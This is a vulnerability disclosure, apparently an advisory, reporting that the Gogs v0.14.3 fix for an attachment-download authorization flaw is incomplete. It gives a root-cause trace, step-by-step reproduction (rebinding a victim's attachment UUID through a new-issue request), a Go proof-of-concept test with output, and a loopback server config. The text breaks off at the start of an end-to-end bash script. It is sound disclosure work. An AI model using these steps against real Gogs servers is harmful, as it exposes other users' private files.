### Summary CVE-2026-52799 (GHSA-p9f5-h3rx-j5qw / GO-2026-5536, 'Missing Authorization in Attachment Download', CVSS 7.5 High) was announced as fixed in v0.14.3. The official patch (commit d3ca23f9f33d5710472a775d6dcd3a7bb128bb05, PR #8320) added an authorization check to a single location: the download handler (GET /attachments/:uuid in cmd/gogs/internal/web/web.go). However, the write paths that bind an attachment to an issue/comment/release were left untouched. As a result, an authenticated registered user who knows the UUID of a victim's private attachment can simply bind that UUID to an issue in their own repository, which rebinds the attachment's owning repository to the attacker's repository, bypasses the patched download check, and downloads the original file. The rebinding simultaneously removes the attachment from the victim's issue (integrity impact). In short, this is an incomplete fix (residual vulnerability) of CVE-2026-52799. ### Details Root cause: the Attachment model (internal/database/attachment.go:19-30) has NO uploader/owner column at all (only ID / UUID / IssueID / CommentID / ReleaseID / Name / CreatedUnix). Therefore all access control for an attachment relies entirely on reverse-resolving the owning repository through IssueID/ReleaseID and then checking access to that repository. The core problem is that this reverse-resolution key (IssueID) can be overwritten by write paths without any validation. Scope the official patch actually reached: the official fix commit d3ca23f9f33d5710472a775d6dcd3a7bb128bb05 (PR #8320) changed only 2 files: CHANGELOG.md + cmd/gogs/internal/web/web.go (the download handler). The added code reverse-resolves the repository from attach.IssueID/ReleaseID and then runs if !repo.HasAccess(c.UserID()) { c.NotFound() }. The write/binding paths - newIssue / newComment / release creation / getAttachmentsByUUIDs - were NOT touched at all. (This patch scope was confirmed by downloading the official .patch file directly.) Vulnerable paths left outside the patch scope (actual Go call path, traced end to end route -> DB -> download): 1. Route internal/route/repo/issue.go:415-429 NewIssuePost - passes attachments = f.Files (a user-controlled array of UUID strings) straight into database.NewIssue(c.Repo.Repository, issue, labelIDs, attachments) with NO ownership validation. 2. internal/database/issue.go:737-749 newIssue - calls getAttachmentsByUUIDs(e, opts.Attachments), then in a loop does attachments[i].IssueID = opts.Issue.ID; e.ID(...).Update(...), unconditionally overwriting the existing issue_id. 3. internal/database/attachment.go:114-122 getAttachmentsByUUIDs - only runs e.In('uuid', uuids).Find(...). There is NO uploader/owner/issue_id==0 filter. So even another user's private attachment UUID becomes a lookup/update target. 4. The same unvalidated rebinding exists in internal/database/comment.go:231-241 (comments) and internal/database/release.go:183-186/:326-330 (releases). 5. Download handler (cmd/gogs/internal/web/web.go:187-243) - after rebinding, attach.IssueID is now the attacker's issue, issue.Repo is the attacker's repository, so HasAccess(attacker)=true. The actual file's storage path (LocalPath) is UUID-based and immutable, so the rebound metadata alone causes the victim's original file bytes to be served. In summary: the official patch only closed 'missing authorization at read (download) time', while the other side of the coin - 'at write (bind) time, an arbitrary UUID can be reassigned to one's own object' - remains open. Because access control depends solely on the rebindable IssueID and the attachment itself has no owner concept, the patch is structurally incomplete. Steps to reproduce (summary): 1. Prepare two accounts, attacker and victim (both creatable via web sign-up). 2. Victim: create a private repository and attach a file to an issue. Assume the attacker knows the UUID returned by the upload response (POST /issues/attachments) - the same precondition as the original CVE (prior knowledge of the UUID). 3. Attacker: request `GET /attachments/<uuid>` directly -> HTTP 404 (the p9f5 patch blocks it correctly). 4. Attacker: create their own repository. 5. Attacker: create a new issue in their own repository while sending `files[]=<victim UUID>` (`POST /<attacker>/<repo>/issues/new`) -> this triggers the rebinding. 6. Attacker: request `GET /attachments/<uuid>` again -> HTTP 200 + the victim's private attachment content. 7. The attachment link disappears from the victim's issue page (integrity impact). ### Proof of concept Verification was done in two stages: (A) a unit PoC that faithfully reproduces, in pure-Go SQLite, the same queries xorm emits; (B) an end-to-end reproduction against a real running gogs v0.14.3 instance with two accounts. Both stages' full source, run commands, and actual output are included below without omission. (B) is the decisive evidence (it drives the actual patched download handler and shows the 404 -> 200 transition); (A) independently confirms the same DB semantics with no binary/network. PoC (A) - xorm SQL reproduction (SQLite, no network/binary required) Save as pocrebind/rebind_test.go at the clone root (_workspace/_repo_gogs-gogs) and run go test ./pocrebind -run PoC -v (deleted after verification, go.mod restored). ```go package pocrebind import ( 'database/sql'; 'fmt'; 'testing'; _ 'github.com/glebarez/go-sqlite' ) func mustExec(t *testing.T, db *sql.DB, q string, a ...any){ t.Helper(); if _,e:=db.Exec(q,a...);e!=nil{t.Fatalf('%q: %v',q,e)} } func TestPoC_AttachmentRebindBypassesP9F5(t *testing.T){ db,_ := sql.Open('sqlite', ':memory:'); defer db.Close() mustExec(t,db,`CREATE TABLE repository(id INTEGER PRIMARY KEY, owner_id INT, is_private INT)`) mustExec(t,db,`CREATE TABLE issue(id INTEGER PRIMARY KEY, repo_id INT)`) // no uploader/owner column, like the real model mustExec(t,db,`CREATE TABLE attachment(id INTEGER PRIMARY KEY, uuid TEXT UNIQUE, issue_id INT, comment_id INT, release_id INT, name TEXT)`) mustExec(t,db,`INSERT INTO repository VALUES (1,100,1)`) // victim A private repo mustExec(t,db,`INSERT INTO issue VALUES (10,1)`) const uu='e3b0c442-98fc-1c14-9afb-f4c8996fb924' mustExec(t,db,`INSERT INTO attachment VALUES (1,?,10,0,0,'secret.pdf')`,uu) mustExec(t,db,`INSERT INTO repository VALUES (2,200,0)`) // attacker B repo mustExec(t,db,`INSERT INTO issue VALUES (20,2)`) const bID=200 hasAccess:=func(repo,u int)bool{ var o int; db.QueryRow(`SELECT owner_id FROM repository WHERE id=?`,repo).Scan(&o); return o==u } resolve:=func(uuid string)(repo int){ var i int; db.QueryRow(`SELECT issue_id FROM attachment WHERE uuid=?`,uuid).Scan(&i); if i>0 { db.QueryRow(`SELECT repo_id FROM issue WHERE id=?`,i).Scan(&repo) }; return } r0:=resolve(uu); fmt.Printf('[before] repo=%d attackerAccess=%v
',r0,hasAccess(r0,bID)) // getAttachmentsByUUIDs: no owner/issue_id==0 condition rows,_:=db.Query(`SELECT id FROM attachment WHERE uuid IN (?)`,uu); var ids []int for rows.Next(){ var id int; rows.Scan(&id); ids=append(ids,id) }; rows.Close() // newIssue rebinding loop: unconditionally overwrites issue_id for _,id:=range ids { mustExec(t,db,`UPDATE attachment SET issue_id=? WHERE id=?`,20,id) } r1:=resolve(uu); fmt.Printf('[after ] repo=%d attackerAccess=%v
',r1,hasAccess(r1,bID)) var n int; db.QueryRow(`SELECT COUNT(*) FROM attachment WHERE issue_id=10`).Scan(&n) fmt.Printf('[after ] victim issue10 attachments=%d
',n) if !hasAccess(r1,bID){ t.Fatal('no bypass') } } ``` Run commands: # after saving pocrebind/rebind_test.go at the clone root go get github.com/glebarez/go-sqlite go test ./pocrebind -run PoC -v Actual output: === RUN TestPoC_AttachmentRebindBypassesP9F5 [before] repo=1 attackerAccess=false // post-fix default: attacker cannot access [after ] repo=2 attackerAccess=true // after rebinding: resolves to attacker repo -> download allowed [after ] victim issue10 attachments=0 // attachment lost from victim's issue (integrity) --- PASS: TestPoC_AttachmentRebindBypassesP9F5 PASS ok gogs.io/gogs/pocrebind PoC (B) - real running gogs v0.14.3 instance + two accounts end-to-end (decisive evidence) Environment/build: OS darwin 23.6.0 (arm64), Go go1.27.1 darwin/arm64. Docker not required (local Go toolchain). v0.14.3 (= the release announced as the GHSA-p9f5 fix) is built in an isolated git worktree. All traffic is 127.0.0.1 loopback only. git worktree add <scratch>/wt_v0143 v0.14.3 cd <scratch>/wt_v0143 && go build -o <scratch>/gogs_v0143 . # v0.14.3 entrypoint = repo root Key custom/conf/app.ini (temp dir, SQLite, loopback only): ```ini RUN_USER = <current OS user> RUN_MODE = prod [server] PROTOCOL = http HTTP_ADDR = 127.0.0.1 HTTP_PORT = 3200 EXTERNAL_URL = http://127.0.0.1:3200/ DISABLE_SSH = true OFFLINE_MODE = true [database] TYPE = sqlite3 PATH = <tmp>/data/gogs.db [attachment] ENABLED = true ALLOWED_TYPES = */* [security] INSTALL_LOCK = true SECRET_KEY = poc-only-secret-key-local [auth] DISABLE_REGISTRATION = false ``` Start: `GOGS_WORK_DIR=<tmp> ./gogs_v0143 web --config <tmp>/custom/conf/app.ini` -> `GET /` HTTP 200. The first registered user is the admin (victim, id=1), the second is a normal user (attacker, id=2). E2E PoC script - save as `poc_e2e.sh` and run `WORK=<tmp> BASE=http://127.0.0.1:3200 bash poc_e2e.sh`. It handles CSRF (`_csrf` hidden / `X-Csrf-Token`) and session cookies. ```bash #!/usr/bin/env bash # E2E PoC: gogs attachment UUID rebind authz bypass